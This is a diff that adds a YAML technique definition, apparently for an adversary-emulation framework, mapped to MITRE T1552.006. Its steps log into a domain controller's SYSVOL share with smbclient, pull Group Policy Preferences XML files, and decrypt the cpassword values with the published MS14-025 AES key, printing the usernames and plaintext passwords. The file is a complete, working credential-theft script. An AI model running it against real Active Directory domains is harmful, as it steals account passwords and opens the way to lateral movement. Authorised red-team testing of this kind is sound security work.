@@ -1,0 +1,109 @@
+---
+api_version: 2.0
+uuid: 0198218d-7c5f-4653-8141-cbe4354dda11
+name: Extract Passwords from Group Policy Preferences
+authors:
+  - isaac_fletcher
+description: |
+  Enumerates and extracts plaintext passwords from Group Policy Preferences (GPP) XML files on SYSVOL.
+
+  This TTP performs the following:
+  1. Enumerates all XML files on SYSVOL (equivalent to: dir /s *.xml)
+  2. Downloads only GPP-related XML files (Groups.xml, Services.xml, etc.)
+  3. Extracts and decrypts cpassword values using the known AES key (MS14-025)
+requirements:
+  platforms:
+    - os: linux
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1552 Unsecured Credentials
+  subtechniques:
+    - T1552.006 Group Policy Preferences
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: username
+    description: Username in DOMAIN\\user format for SMB authentication
+  - name: password
+    description: Password for SMB authentication
+  - name: output_dir
+    description: Local directory to save downloaded files
+    default: /tmp/gpp_extraction
+steps:
+  - name: download_gpp_xml_files
+    description: Download GPP XML files from SYSVOL
+    inline: |
+      SMB_DOMAIN=$(echo "{{.Args.username}}" | cut -d'\' -f1)
+      SMB_USER=$(echo "{{.Args.username}}" | cut -d'\' -f2)
+
+      mkdir -p "{{.Args.output_dir}}"
+
+      echo "[*] Downloading GPP XML files from SYSVOL..."
+
+      # Download only GPP-related XML files
+      smbclient "//{{.Args.dc}}/SYSVOL" -U "${SMB_DOMAIN}\\${SMB_USER}%{{.Args.password}}" -c "
+        lcd {{.Args.output_dir}}
+        cd {{.Args.domain}}/Policies
+        recurse ON
+        prompt OFF
+        mget Groups.xml
+        mget Services.xml
+        mget ScheduledTasks.xml
+        mget DataSources.xml
+        mget Printers.xml
+        mget Drives.xml
+      " 2>/dev/null
+
+      echo "Downloaded files:"
+      find "{{.Args.output_dir}}" -type f -name "*.xml" -printf "    -> %p\n"
+
+  - name: extract_gpp_passwords
+    description: Extract and decrypt cpassword values from downloaded XML files
+    inline: |
+      # Microsoft published AES key (MS14-025)
+      AES_KEY="4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
+
+      decrypt_cpassword() {
+        local cpass="$1"
+        [ -z "$cpass" ] && return
+        local mod=$((${#cpass} % 4))
+        case $mod in
+          1) cpass="${cpass:0:$((${#cpass}-1))}" ;;
+          2) cpass="${cpass}==" ;;
+          3) cpass="${cpass}=" ;;
+        esac
+        echo -n "$cpass" | base64 -d 2>/dev/null | \
+          openssl enc -d -aes-256-cbc -K "$AES_KEY" -iv "00000000000000000000000000000000" -nopad 2>/dev/null | \
+          iconv -f UTF-16LE -t UTF-8 2>/dev/null | tr -d '\0'
+      }
+
+      echo "Extracting GPP passwords..."
+
+      find "{{.Args.output_dir}}" -type f -name "*.xml" 2>/dev/null | while read -r xml_file; do
+        grep -q "cpassword" "$xml_file" 2>/dev/null || continue
+
+        grep -oP 'cpassword="[^"]+"' "$xml_file" | while read -r match; do
+          cpass="${match#cpassword=\"}" && cpass="${cpass%\"}"
+          [ -z "$cpass" ] && continue
+
+          decrypted=$(decrypt_cpassword "$cpass")
+          username=$(grep -oP 'userName="[^"]*"' "$xml_file" | head -1 | sed 's/userName="//;s/"//')
+          [ -z "$username" ] && username=$(grep -oP 'accountName="[^"]*"' "$xml_file" | head -1 | sed 's/accountName="//;s/"//')
+
+          echo "---"
+          echo "File: $xml_file"
+          [ -n "$username" ] && echo "UserName: $username"
+          echo "Password: ${decrypted:-[DECRYPTION_FAILED]}"
+          echo "cpassword: $cpass"
+        done
+      done
+
+    cleanup:
+      inline: |
+        [ -d "{{.Args.output_dir}}" ] && rm -rf "{{.Args.output_dir}}"
